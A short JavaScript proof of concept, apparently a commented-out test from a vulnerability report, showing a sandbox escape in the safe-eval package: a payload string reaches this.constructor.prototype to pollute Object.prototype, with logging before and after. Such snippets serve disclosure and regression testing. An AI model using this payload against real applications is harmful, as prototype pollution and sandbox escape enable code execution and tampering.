// test("Arbitrary code execution in safe-eval", () => {
//   expect.assertions(2);
  var safeEval = require("safe-eval");
console.log({}.polluted);
  try {
    safeEval("this.constructor.prototype.polluted=`yes`");
  } catch (error) {}
console.log({}.polluted);
// });
